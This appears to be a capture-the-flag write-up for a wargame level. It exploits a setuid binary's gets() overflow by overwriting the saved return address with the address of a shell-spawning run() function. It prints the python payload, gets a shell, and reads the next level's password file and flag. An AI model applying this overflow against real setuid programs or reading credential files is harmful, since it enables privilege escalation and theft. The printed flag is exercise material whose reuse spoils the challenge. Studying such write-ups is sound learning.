# Level1

## 1. Context

```bash
$ id
uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)

$ pwd
/home/user/level1

$ ls -la
[...]
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
[...]
```

## 2. Program behavior

Testing it :

```bash
$ ./level1

```

Nothing... Closes when we press `ENTER`.

## 3. Code overview

The `main()` function simply creates a buffer and calls `gets()`.

The `run()` function is very interesting because launches a shell.
It is never called.

## 4. Exploit

We need to overwrite return address with `run()` address.

Let's get the address of `run()` using gdb :
```bash
(gdb) info function
[...]
0x08048444  run
[...]
```

After some tests, we find that the **saved EIP is overwritten after 76 bytes**.

## 5. Getting the flag

```bash
$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
$ cat /tmp/payload - | ./level1
```

** It launched a new shell.**

```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

End of simulation
